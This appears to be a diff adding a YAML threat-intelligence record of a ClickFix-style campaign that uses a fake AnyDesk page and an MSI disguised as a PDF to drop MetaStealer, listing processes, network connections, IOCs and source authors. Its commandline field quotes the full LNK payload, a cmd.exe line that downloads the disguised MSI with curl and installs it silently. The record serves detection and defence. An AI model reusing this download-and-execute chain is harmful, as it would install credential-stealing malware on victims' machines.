@@ -1,0 +1,57 @@
+description: "A ClickFix\u2011style attack chain that uses a fake Cloudflare Turnstile,\
+  \ Windows File Explorer search protocol, and an MSI disguised as a PDF to drop MetaStealer."
+attribution: Unknown threat actor (APT not identified)
+malware_families:
+- MetaStealer
+TTPs:
+  processes:
+  - cmd.exe
+  - msedge.exe
+  - msiexec.exe
+  - ls26.exe
+  - 1.js
+  commandline:
+  - '''%COMPUTERNAME%6 . pdf'' is not a valid command; the LNK payload contains: cmd.exe
+    /k "start msedge https://anydesk.com/en/downloads/windowslatest & curl -slLo %TEMP%\%COMPUTERNAME%6.pdf
+    https://%COMPUTERNAME%6.chat1.store/update/6.pdf & msiexec /i %TEMP%\%COMPUTERNAME%6.pdf
+    /gn | taskkill /f /im cmd.exe"'
+  powershell: []
+  scripting_engine:
+  - 1.js
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: cmd.exe
+    destination: anydesk.com
+    port: 443
+  - process: cmd.exe
+    destination: chat1.store
+    port: 443
+  - process: msedge.exe
+    destination: anydesk.com
+    port: 443
+  file_activity:
+  - '%TEMP%\\%COMPUTERNAME%6.pdf'
+  - C:\\Program Files (x86)\\MetaStealer\\ls26.exe
+  persistence: []
+  process_relations:
+  - cmd.exe -> msedge.exe
+  - cmd.exe -> curl
+  - cmd.exe -> msiexec.exe
+IOCs:
+  domains:
+  - anydeesk.ink
+  - verification.anydeesk.ink
+  - chat1.store
+  - secureview.anydeesk.ink
+  - anydesk.com
+  ips:
+  - 172.67.196.187
+  hashes: []
+authors:
+- John Hammond
+- Alden Schmidt
+- Lindsey O'Donnell-Welch
+reference: https://www.huntress.com/blog/fake-anydesk-clickfix-metastealer-malware
+date_of_publication: August 29, 2025
+file_creation_date: September 01, 2025
